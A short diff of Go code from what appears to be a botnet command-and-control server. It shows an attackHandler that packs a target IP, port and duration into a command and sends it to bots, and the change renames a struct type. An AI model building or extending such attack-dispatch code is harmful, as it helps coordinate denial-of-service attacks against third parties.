@@ -329,7 +329,7 @@ func (s *APIServer) attackHandler(w http.ResponseWriter, r *http.Request) {
 	cmdPacket.Port = uint16(req.Port)
 	cmdPacket.Duration = uint32(req.Duration)
 	sendToBots(cmdPacket)
-	a := attack{
+	a := Attack{
 		method:   req.Method,
 		ip:       req.TargetIP,
 		port:     strconv.Itoa(req.Port),
